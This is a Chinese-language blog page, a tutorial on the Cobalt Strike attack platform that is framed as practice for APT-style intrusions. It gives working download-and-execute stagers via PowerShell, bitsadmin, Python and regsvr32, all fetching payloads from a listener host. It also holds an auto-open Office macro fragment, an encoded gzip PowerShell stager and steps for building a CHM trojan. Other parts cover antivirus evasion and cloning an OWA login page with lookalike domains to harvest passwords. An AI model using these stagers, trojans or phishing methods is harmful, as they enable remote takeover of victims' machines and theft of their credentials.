@@ -1,0 +1,863 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="PS:有些截图IP不统一是因为我有空的时候写，有时不在同一个网络下，所以分配的IP地址会不一样。禁止转载。不允许转载，否则再也不会更新任何东西。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cobalt Strike学习（持续）">
+<meta property="og:url" content="http://yoursite.com/2017/04/09/Cobalt-Strike学习（持续）/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description" content="PS:有些截图IP不统一是因为我有空的时候写，有时不在同一个网络下，所以分配的IP地址会不一样。禁止转载。不允许转载，否则再也不会更新任何东西。">
+<meta property="og:image" content="http://i.imgur.com/6uL1CNd.jpg">
+<meta property="og:image" content="http://i.imgur.com/uvEULj8.jpg">
+<meta property="og:image" content="http://i.imgur.com/Q4NlVVH.jpg">
+<meta property="og:image" content="http://i.imgur.com/IJIOa3L.jpg">
+<meta property="og:image" content="http://i.imgur.com/MReUmt6.jpg">
+<meta property="og:image" content="http://i.imgur.com/su6iO7t.jpg">
+<meta property="og:image" content="http://i.imgur.com/9iRJiHU.jpg">
+<meta property="og:image" content="http://i.imgur.com/lBUUlUl.jpg">
+<meta property="og:image" content="http://i.imgur.com/MxouloZ.jpg">
+<meta property="og:image" content="http://i.imgur.com/OYGlOKp.jpg">
+<meta property="og:image" content="http://i.imgur.com/eRJP50B.jpg">
+<meta property="og:image" content="http://i.imgur.com/xrE4Xbj.jpg">
+<meta property="og:image" content="http://i.imgur.com/MrtHGAa.jpg">
+<meta property="og:image" content="http://i.imgur.com/tsK6Ctx.jpg">
+<meta property="og:image" content="http://i.imgur.com/hLozmZx.jpg">
+<meta property="og:image" content="http://i.imgur.com/8dv8wor.jpg">
+<meta property="og:image" content="http://i.imgur.com/udz511N.jpg">
+<meta property="og:image" content="http://i.imgur.com/rEcrMMh.jpg">
+<meta property="og:image" content="http://i.imgur.com/iYKT3gN.jpg">
+<meta property="og:image" content="http://i.imgur.com/AzAfwIM.jpg">
+<meta property="og:image" content="http://i.imgur.com/dIaGp3M.jpg">
+<meta property="og:image" content="http://i.imgur.com/i6v145u.jpg">
+<meta property="og:image" content="http://i.imgur.com/hON5z6r.jpg">
+<meta property="og:image" content="http://i.imgur.com/ZG8UHeL.jpg">
+<meta property="og:image" content="http://i.imgur.com/YPG3wrs.jpg">
+<meta property="og:image" content="http://i.imgur.com/Pp2U2r1.jpg">
+<meta property="og:image" content="http://i.imgur.com/c77nQVB.jpg">
+<meta property="og:image" content="http://i.imgur.com/r3iM7Hq.jpg">
+<meta property="og:image" content="http://i.imgur.com/8RYjSz4.jpg">
+<meta property="og:image" content="http://i.imgur.com/t22fU3n.jpg">
+<meta property="og:image" content="http://i.imgur.com/7ZJzXhm.jpg">
+<meta property="og:image" content="http://i.imgur.com/fEb7vwt.jpg">
+<meta property="og:image" content="http://i.imgur.com/iYTEHHx.jpg">
+<meta property="og:image" content="http://i.imgur.com/CGeSDQf.jpg">
+<meta property="og:image" content="http://i.imgur.com/id35aWA.jpg">
+<meta property="og:image" content="http://i.imgur.com/rso4gEp.jpg">
+<meta property="og:image" content="http://i.imgur.com/KPo3nHO.jpg">
+<meta property="og:image" content="http://i.imgur.com/Dsd6OSm.jpg">
+<meta property="og:image" content="http://i.imgur.com/mmDEzGM.jpg">
+<meta property="og:image" content="http://i.imgur.com/T6mSq2n.jpg">
+<meta property="og:image" content="http://i.imgur.com/ZzM5PP1.jpg">
+<meta property="og:image" content="http://i.imgur.com/qC6vash.jpg">
+<meta property="og:image" content="http://i.imgur.com/0rfYg7g.jpg">
+<meta property="og:image" content="http://i.imgur.com/gJrwxzb.jpg">
+<meta property="og:image" content="http://i.imgur.com/wOP39rq.jpg">
+<meta property="og:image" content="http://i.imgur.com/t92R0ky.jpg">
+<meta property="og:image" content="http://i.imgur.com/XbbvOge.jpg">
+<meta property="og:image" content="http://i.imgur.com/kFUpsVc.jpg">
+<meta property="og:image" content="http://i.imgur.com/ZXJWsSj.jpg">
+<meta property="og:image" content="http://i.imgur.com/8i2uglW.jpg">
+<meta property="og:image" content="http://i.imgur.com/LnnPkKV.jpg">
+<meta property="og:image" content="http://i.imgur.com/4J9MySf.jpg">
+<meta property="og:image" content="http://i.imgur.com/niqYV5Z.jpg">
+<meta property="og:image" content="http://i.imgur.com/M0MSvn1.jpg">
+<meta property="og:image" content="http://i.imgur.com/i1sqEWB.jpg">
+<meta property="og:image" content="http://i.imgur.com/GcaFAVa.jpg">
+<meta property="og:image" content="http://i.imgur.com/qj1nzgu.jpg">
+<meta property="og:image" content="http://i.imgur.com/IeHdOai.jpg">
+<meta property="og:image" content="http://i.imgur.com/MbxSzVv.jpg">
+<meta property="og:image" content="http://i.imgur.com/m7gbUte.jpg">
+<meta property="og:image" content="http://i.imgur.com/zAyCadX.jpg">
+<meta property="og:image" content="http://i.imgur.com/vJWsplX.jpg">
+<meta property="og:image" content="http://i.imgur.com/XWToLw1.jpg">
+<meta property="og:image" content="http://i.imgur.com/mYKx0R6.jpg">
+<meta property="og:image" content="http://i.imgur.com/Dyx2vID.jpg">
+<meta property="og:image" content="http://i.imgur.com/nVk4ZO9.jpg">
+<meta property="og:updated_time" content="2017-04-09T07:40:20.224Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cobalt Strike学习（持续）">
+<meta name="twitter:description" content="PS:有些截图IP不统一是因为我有空的时候写，有时不在同一个网络下，所以分配的IP地址会不一样。禁止转载。不允许转载，否则再也不会更新任何东西。">
+<meta name="twitter:image" content="http://i.imgur.com/6uL1CNd.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> Cobalt Strike学习（持续） | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Cobalt Strike学习（持续）
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2017-04-09T15:24:53+08:00" content="2017-04-09">
+              2017-04-09
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/04/09/Cobalt-Strike学习（持续）/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/04/09/Cobalt-Strike学习（持续）/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="http://i.imgur.com/6uL1CNd.jpg" alt=""></p>
+<p>PS:有些截图IP不统一是因为我有空的时候写，有时不在同一个网络下，所以分配的IP地址会不一样。<br>禁止转载。不允许转载，否则再也不会更新任何东西。</p>
+<a id="more"></a>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经常看到披露出来<code>APT(Advanced Persistent Threat) －－－高级持续性威胁</code>报告，据目前我所了解到的有常用两种攻击手法，<code>水坑式攻击</code>和<code>鱼叉式钓鱼邮件攻击</code>手法，其实我也想模仿这样攻击手法，在渗透时候遇到有些目标简直是无从下手。<br>很早之前就接触了<code>Metasploit</code>工具，内网渗透非常强大，当时用过<code>Cobalt Strike 2.0</code>版本，主要是结合<code>Metasploit</code>，可以称为图形化MSF工具。而<code>Cobalt Strike 3.0</code>已经不再使用<code>Metasploit</code>框架而作为一个独立的平台使用。</p>
+<p><code>Cobalt Strike</code>对我目前工作来说比较重要，主要想转换一下常规的渗透思路。有很多站已经没有办法捡漏了，当前是自己一个人在奋斗，研究各种APT攻击手法脱离常规渗透手法，提高自己渗透水平。</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>Cobalt Strike集成了端口转发、扫描，多模式端口监听，<code>Windows exe</code>木马生成，<code>Windows dll(动态链接库)</code>木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。</p>
+</blockquote>
+<p>360评价<code>APT-TOCS</code>攻击尽管看起来已经接近APT水准的攻击能力，但并非更多依赖攻击团队自身的能力，而是依托商业的自动化攻击测试平台来达成。</p>
+<h3 id="Tools-Link"><a href="#Tools-Link" class="headerlink" title="Tools Link"></a>Tools Link</h3><p><strong>Cobalt Strike</strong><br><code>https://www.cobaltstrike.com</code></p>
+<p><strong>Kali Linux</strong><br><code>https://www.kali.org</code></p>
+<p><strong>Metasploit Framework</strong><br><code>https://www.metasploit.com</code></p>
+<p><strong>PowerSplit</strong><br><code>https://github.com/mattifestation/PowerSploit</code></p>
+<p><strong>PiwerTools</strong><br><code>https://github.com/PowerShellEmpire/PowerTools</code></p>
+<p><strong>Veil Evasion Framework</strong><br><code>https://github.com/Veil-Framework/Veil-Evasion</code></p>
+<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><code>Cobalt Strike</code>分为客户端和服务端，可分布式操作，可以协同作战。但一定要架设在外网上。<br>当然你知道利用这款工具主要用于内网渗透以及APT攻击。<br><img src="http://i.imgur.com/uvEULj8.jpg" alt=""></p>
+<h4 id="Team-Server-Setup"><a href="#Team-Server-Setup" class="headerlink" title="Team Server Setup"></a>Team Server Setup</h4><p><img src="http://i.imgur.com/Q4NlVVH.jpg" alt=""></p>
+<p>启动服务：<br><code>./teamserver 192.168.3.11 password</code></p>
+<p>通过客户端来连接：<br><code>Cobalt Strike</code>提供了linux以及windows下的客户端。<br><img src="http://i.imgur.com/IJIOa3L.jpg" alt=""></p>
+<p><img src="http://i.imgur.com/MReUmt6.jpg" alt=""></p>
+<p>当攻击目标在控制台所操作的指令都会被记录到保留在<code>Cobalt Strike</code>目录<code>logs</code>下；<br><img src="http://i.imgur.com/su6iO7t.jpg" alt=""></p>
+<p>ps：破解版是无法更新的。</p>
+<h3 id="功能了解"><a href="#功能了解" class="headerlink" title="功能了解"></a>功能了解</h3><h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><p><img src="http://i.imgur.com/9iRJiHU.jpg" alt=""></p>
+<h5 id="Preferences"><a href="#Preferences" class="headerlink" title="Preferences"></a>Preferences</h5><p><code>Perferences</code>设置<code>Cobal Strike</code>界面、控制台、以及输出报告样式、<code>TeamServer</code>连接记录。<br><img src="http://i.imgur.com/lBUUlUl.jpg" alt=""></p>
+<h5 id="Visualization"><a href="#Visualization" class="headerlink" title="Visualization"></a>Visualization</h5><p><img src="http://i.imgur.com/MxouloZ.jpg" alt=""></p>
+<p>其实也就是工具拦上的三个图标,主要输出结果的形式。<br><img src="http://i.imgur.com/OYGlOKp.jpg" alt=""></p>
+<p><code>VPN Interfaces</code>设置VPN接口。后面详细讲解。</p>
+<h5 id="Listenrs"><a href="#Listenrs" class="headerlink" title="Listenrs"></a>Listenrs</h5><p>使用<code>Cobalt Strike</code>首先需要创建一个<code>Listener</code>,依次点击 <code>Cobalt Strike -&gt; Listeners</code> ，然后点击Add便可以创建自己想要的<code>Listeners</code>，<code>Cobalt Strike3.0</code>通过官网查询，官方给出的解释是没有<code>Linux</code>监控的，意思是不能控Linux机器？<br>除了以下标为<code>x86/x64</code>，其它只支持32位</p>
+<blockquote>
+<p>windows/beacon_dns/reverse_dns_txt<br>windows/beacon_dns/reverse_http    x86/x64<br>windows/beacon_http/reverse_http   x86/x64<br>windows/beacon_https/reverse_https  x86/x64<br>windows/beacon_smb/bind_pipe       x86/x64<br>windows/foreign/reverse_dns_txt<br>windows/foreign/reverse_http<br>windows/foreign/reverse_https<br>windows/foreign/reverse_tcp</p>
+</blockquote>
+<p><img src="http://i.imgur.com/eRJP50B.jpg" alt=""></p>
+<p>先演示简单例子<br>这里来生成一个PowerShell，可以获得一个权限，这里通过实验机来访问：<br><img src="http://i.imgur.com/xrE4Xbj.jpg" alt=""></p>
+<p><code>Attack -&gt; Web Drive-by -&gt; Scripted Web Delivery</code></p>
+<p><img src="http://i.imgur.com/MrtHGAa.jpg" alt=""></p>
+<p>这里选择通过PowerShell执行，在<code>win2003 x64</code>位以上都有PowerShell这个功能。<br><img src="http://i.imgur.com/tsK6Ctx.jpg" alt=""></p>
+<p><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.117:80/a&#39;))&quot;</code><br>这里生成我们的PowerShell,用实验机访问。<br><img src="http://i.imgur.com/hLozmZx.jpg" alt=""></p>
+<p>通常被控制的主机每60秒发送一心跳，如果平常不用基本是没有什么流量。<br><img src="http://i.imgur.com/8dv8wor.jpg" alt=""></p>
+<p>主要是通过<code>HTTP GET</code>请求，这里我通过抓取进程包，可以看到传输的内容经过加密。<code>192.168.4.100:9987</code>则服务端创建监听的端口。<br><img src="http://i.imgur.com/udz511N.jpg" alt=""></p>
+<p>为了可以更加隐蔽性还可以自己导入https证书<br><img src="http://i.imgur.com/rEcrMMh.jpg" alt=""></p>
+<p>以及dns通讯<br><img src="http://i.imgur.com/iYKT3gN.jpg" alt=""></p>
+<h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>Applications    -&gt; 获取浏览器版本信息<br>Credentials        -&gt;    凭证，当通过hashdump或者Mimikatz抓取过的密码都会储存在这里。<br>Downloads        -&gt;    下载文件<br>Event Log        -&gt;    主机上线记录，以及团队协作聊天记录<br>Keystrokes        -&gt; 键盘记录<br>Proxy Pivots    -&gt; 代理模块<br>Screenshots        -&gt; 进程截图<br>Script Console        -&gt; 控制台<br>Targets            -&gt; 显示目标<br>Web Log            -&gt; Web访问记录</p>
+<h3 id="Client-side-Attacks"><a href="#Client-side-Attacks" class="headerlink" title="Client-side Attacks"></a>Client-side Attacks</h3><p>通常我的目标安全设置的非常变态、常规的渗透手法都还没找出口子时，就可以利用此方法来突破。<br>当我的目标只是一个邮箱时，我根本无法从社工下手获得我想要的东西，就可以利用此方法来突破。</p>
+<p><img src="http://i.imgur.com/AzAfwIM.jpg" alt=""></p>
+<p>发送恶意邮件给内部企业人员，获取内部一定权限进行内网渗透。<br><img src="http://i.imgur.com/dIaGp3M.jpg" alt=""></p>
+<h4 id="Packages"><a href="#Packages" class="headerlink" title="Packages"></a>Packages</h4><p>这些模块主要来生成Payload</p>
+<p><img src="http://i.imgur.com/i6v145u.jpg" alt=""></p>
+<h5 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h5><p>生成一个网页Payload， 这里经过我测试，生成的木马好像只有在IE上测试成功，如果是其它浏览器会被拦截或被识别木马。</p>
+<p><img src="http://i.imgur.com/hON5z6r.jpg" alt=""></p>
+<p>有三种执行模式，一种是平常的exe执行、其它通过PowerShell和VBA来执行木马。达到控制这台主机权限。<br>会生成一个<code>evil.hta</code>文件,配合 <code>Attacks -&gt; Web Drive-By -&gt; Host File</code> 利用。</p>
+<h5 id="MS-Office-Macro"><a href="#MS-Office-Macro" class="headerlink" title="MS Office Macro"></a>MS Office Macro</h5><p><code>Attacks -&gt; Packages -&gt; MS Office Macro -&gt; Copy</code></p>
+<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As <span class="built_in">String</span></span><br><span class="line">    lpDesktop As <span class="built_in">String</span></span><br><span class="line">    lpTitle As <span class="built_in">String</span></span><br><span class="line">.... 略</span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+<p>生成以下代码，放入到Word宏里面。<br><img src="http://i.imgur.com/ZG8UHeL.jpg" alt=""></p>
+<p>保存需另存为启用宏Word文档<br><img src="http://i.imgur.com/YPG3wrs.jpg" alt=""></p>
+<p><img src="http://i.imgur.com/Pp2U2r1.jpg" alt=""></p>
+<p>这里会提示启用宏，这时候你就要靠你的心理学还是其它手段，让你的目标启用宏，但多数一般的电脑白痴都不知道宏是什么。<br>成功率还是有的，但不会太高。</p>
+<p><img src="http://i.imgur.com/c77nQVB.jpg" alt=""></p>
+<h5 id="Payload-Generator"><a href="#Payload-Generator" class="headerlink" title="Payload Generator"></a>Payload Generator</h5><p><img src="http://i.imgur.com/r3iM7Hq.jpg" alt=""><br>生成各类语言的shellcode</p>
+<p>这里生成的ShellCodes可以通过<code>Veil Evasion Framework</code>免杀框架来达到免杀目的</p>
+<h5 id="USB-CD-AutoPlay"><a href="#USB-CD-AutoPlay" class="headerlink" title="USB/CD AutoPlay"></a>USB/CD AutoPlay</h5><p>U盘插入触发</p>
+<h5 id="Windows-Dropper"><a href="#Windows-Dropper" class="headerlink" title="Windows Dropper"></a>Windows Dropper</h5><h5 id="Windows-Executable"><a href="#Windows-Executable" class="headerlink" title="Windows Executable"></a>Windows Executable</h5><p>生成可执行文件</p>
+<h5 id="Windows-Executable-s"><a href="#Windows-Executable-s" class="headerlink" title="Windows Executable(s)"></a>Windows Executable(s)</h5><p>生成可执行文件还有powershell以及动态链接库</p>
+<h4 id="Web-Drive-by"><a href="#Web-Drive-by" class="headerlink" title="Web Drive-by"></a>Web Drive-by</h4><h5 id="Manage"><a href="#Manage" class="headerlink" title="Manage"></a>Manage</h5><p>主要管理我们所创建的Payload以及各类PowerShell管理地址</p>
+<h5 id="Clone-Site"><a href="#Clone-Site" class="headerlink" title="Clone Site"></a>Clone Site</h5><p>克隆网站，还可以通过克隆的网站实现钓鱼。<br>这里以某个OWA为实例：</p>
+<p><img src="http://i.imgur.com/8RYjSz4.jpg" alt=""></p>
+<p><img src="http://i.imgur.com/t22fU3n.jpg" alt=""></p>
+<p>如果你没有设置<code>System Profiler</code>是没有任何信息的，所以这里需要设置一下。当输入后回车会跳转到正常的网页上，以免被发现。</p>
+<p><code>Attacks -&gt; Web Drive-by -&gt; System Profiler</code></p>
+<p><img src="http://i.imgur.com/7ZJzXhm.jpg" alt=""></p>
+<p>再重复第一个步骤</p>
+<p><img src="http://i.imgur.com/fEb7vwt.jpg" alt=""></p>
+<p><img src="http://i.imgur.com/iYTEHHx.jpg" alt=""><br><img src="http://i.imgur.com/CGeSDQf.jpg" alt=""></p>
+<p><img src="http://i.imgur.com/id35aWA.jpg" alt=""></p>
+<p>这里只是为了演示，当真正攻击时为了更加逼真，你需要注册相同类似的域名,比如www.taobao.xom、可以注册另类域名为www.ta0b0o.com类似。<br>当目标输入用户名以及密码时。看我们的控制台：<br><img src="http://i.imgur.com/rso4gEp.jpg" alt=""><br>当点登录后，会跳转到原版网站上。</p>
+<h5 id="Host-File"><a href="#Host-File" class="headerlink" title="Host File"></a>Host File</h5><p>这是我最不看好的，除了IE能触发外，其它浏览器都会报毒，IE还需要点运行才可执行。</p>
+<p>先生成一个HTML Payload木马<br><code>Attack -&gt; Packages -&gt; HTML Application</code><br><img src="http://i.imgur.com/KPo3nHO.jpg" alt=""><br>这里可以以三种方式执行木马。 但生成的格式是<code>hta</code>所以还是很容易被发现，先生成保存在本地.</p>
+<p><code>Attack -&gt; Web Drive-By -&gt; Host File</code></p>
+<p><img src="http://i.imgur.com/Dsd6OSm.jpg" alt=""></p>
+<p><code>http://192.168.3.11:807/download/update.hta</code><br>这是我们生成的木马。<br><img src="http://i.imgur.com/mmDEzGM.jpg" alt=""><br>需点击运行，才会上线。 这种方法对付电脑白痴还有用，但是现在的电脑白痴都用Google浏览器或其实的都不用ie</p>
+<h5 id="Scripted-Web-Delivery"><a href="#Scripted-Web-Delivery" class="headerlink" title="Scripted Web Delivery"></a>Scripted Web Delivery</h5><p><img src="http://i.imgur.com/T6mSq2n.jpg" alt=""></p>
+<p>生成一段可快速获取权限Payload的，有4种方法，常见的PowerShell,vista以上的系统才有PowerShell,其中Windows2003 x64版本也有PowerShell。</p>
+<p><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.4.102:80/a&#39;))&quot;</code></p>
+<p>当我们的目标可能是<code>Windows 2003 x86</code>的时候，你没有办法使用PowerShell，这里给出了另外三种执行模式，通过bitsadmin命令下载、以及Python中的urllib2模块。</p>
+<p><code>cmd.exe /c bitsadmin /transfer d0b7 http://192.168.4.102:80/b %APPDATA%\d0b7.exe&amp;%APPDATA%\d0b7.exe&amp;del %APPDATA%\d0b7.exe</code></p>
+<p><code>python -c &quot;import urllib2; exec urllib2.urlopen(&#39;http://192.168.4.102:80/c&#39;).read();&quot;</code></p>
+<p>Regsvr32命令用于注册动态链接库文件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。</p>
+<p><code>regsvr32 /s /n /u /i:http://192.168.4.102:80/d scrobj.dll</code></p>
+<h6 id="制作CHM木马"><a href="#制作CHM木马" class="headerlink" title="制作CHM木马"></a>制作CHM木马</h6><blockquote>
+<p>Powershell是windows下面非常强大的命令行工具，并且在windows中Powershell可以利用.NET Framework的强大功能，也可以调用windows API，在win7/server 2008以后，powershell已被集成在系统当中。 除此之外，使用powershell能很好的bypass各种AV，在渗透测试中可谓是一个神器。此次使用的是开源的powershell脚本集nishang中的client来制作钓鱼文件。</p>
+<p>在介绍怎么使用CHM来作为后门之前，首先要知道CMH是什么东西。<br>CHM（Compiled Help Manual）即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。CHM支持Javas cript、VBs cript、ActiveX、Java Applet、Flash、常见图形文件(GIF、JPEG、PNG)、音频视频文件(MID、WAV、AVI)等等，并可以通过URL与Internet联系在一起。因为使用方便，形式多样也被采用作为电子书的格式。</p>
+</blockquote>
+<p>可以使用<code>EasyCHM</code>来制作CHM文件</p>
+<p>PowerShelld系统中禁止执行脚本解决方法：<br><code>set-ExceutionPolicy RemoteSigned</code><br>选择<code>[Y]</code></p>
+<p>导入模块：<br><code>Import-Module .\Out-CHM.ps1</code><br><code>Out-CHM -PayloadURL http://192.168.4.102:88 -HHCPath &quot;C:\Program Files (x86)\HTML Help Workshop&quot;</code></p>
+<p>电脑没装<code>hhc.exe</code>通过<code>http://www.microsoft.com/en-us/download/details.aspx?id=21138</code>下载安装，否则会报错。</p>
+<p>但是通过这种方法制作的chm文档，打开时会有黑屏闪过很容易被擦觉。<code>Evi1cg</code>大牛已经找到了方法并写好了利用工具。</p>
+<p>通过rundll32.exe执行js<br><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;alert(&#39;foo&#39;);</code></p>
+<p>rundll32是什么请阅读以下两篇文章：<br><a href="http://bobao.360.cn/learning/detail/164.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/164.html</a><br><a href="http://support.microsoft.com/kb/164787/" target="_blank" rel="external">http://support.microsoft.com/kb/164787/</a></p>
+<p>通过<code>Scripted Web Delivery</code>生成的PowerShell,取出木马地址。</p>
+<p>工具用法：<br><code>Python OutChm.py -r http://192.168.4.102:88 -o exp.chm</code></p>
+<p>来看一下木马地址所生成的是什么：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=<span class="built_in">New-Object</span> IO.MemoryStream(,[Convert]::FromBase64String(<span class="string">"H4sIAAAAAAAAAL1X+2/ayBP/OfwV1imSbR3hnZRWilQDMeBiQjCvhENo8a7NhrWX2msevfZ/v/GDll7S++Z00hfJ0j5mZmc+88Qi4soSAbWFyTGRriYkCCn3pUoud9niXSHdSh/+QJhe5JOpXkeOktfx/NFETBeEaMcgHaISnKqbzQM/</span><br><span class="line">...略</span><br><span class="line">f7SFz1YVLMyR9zua4jnSEU0i8wtJPPUl2N579QoEBcPfMVTPhJG1QukSp172bSJZK+SVcAihZWKzDmB24U90Qp/dfyVdqDKQnjV2lIbAKj7JXBV9DrCIw2sehESEwMZ38B4j+QVgYNAAA="</span>));IEX (<span class="built_in">New-Object</span> IO.StreamReader(<span class="built_in">New-Object</span> IO.Compression.GzipStream(<span class="variable">$s</span>,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</span><br></pre></td></tr></table></figure>
+<p>经过编码的PowerShell，如果不是通过Cobalt Strike生成，也可以通过nishang的<code>Invoke-Encode.ps1</code>进行编码，有现成的工具这里不多此一举。</p>
+<p><img src="http://i.imgur.com/ZzM5PP1.jpg" alt=""></p>
